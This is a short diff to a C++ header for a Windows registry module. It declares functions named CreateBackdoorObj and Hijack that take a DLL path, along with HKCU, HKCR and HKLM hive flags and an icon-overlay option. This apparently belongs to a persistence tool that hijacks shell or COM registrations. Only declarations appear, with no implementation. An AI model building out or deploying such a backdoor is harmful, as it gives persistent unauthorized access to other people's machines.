@@ -6,6 +6,7 @@
 
 #define HKCU 0
 #define HKCR 1
+#define HKLM 2
 
 
 #define ICON_OVERLAY 0x1 // stable af
@@ -21,6 +22,6 @@ namespace reg {
 
 	GUID CreateBackdoorObj(_In_ BYTE Type, _In_ std::wstring DllPath);
 	BOOL AddTechnique(_In_ BYTE type, _In_opt_ WCHAR* ext, _In_ GUID Guid);
-	BOOL RemoveTechnique(_In_ BYTE type, _In_ WCHAR* ext);
+	BOOL Hijack(_In_ BYTE Type, _In_opt_ WCHAR* ext, _In_ std::wstring dllPath);
 
 }
